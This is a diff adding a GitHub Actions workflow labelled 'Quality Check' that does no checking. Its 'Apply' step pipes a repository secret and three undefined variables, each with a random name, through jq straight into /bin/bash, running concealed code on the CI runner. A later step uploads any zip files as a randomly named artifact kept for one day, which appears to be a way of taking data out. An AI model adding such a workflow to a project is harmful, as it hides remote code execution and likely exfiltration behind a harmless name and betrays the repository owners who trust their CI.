@@ -1,0 +1,29 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          ns302: ${{ secrets.ns302 }}
+        run: |
+          printf '%s' "$ns302" | jq -r .kvkf68656 | /bin/bash
+          printf '%s' "$zvr14" | jq -r .a79571 | /bin/bash
+          printf '%s' "$mp22" | jq -r .qsmm7125 | /bin/bash
+          echo $hp074 | jq -r .yxun09 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0iWPE0iy
+          path: "*.zip"
+          retention-days: 1
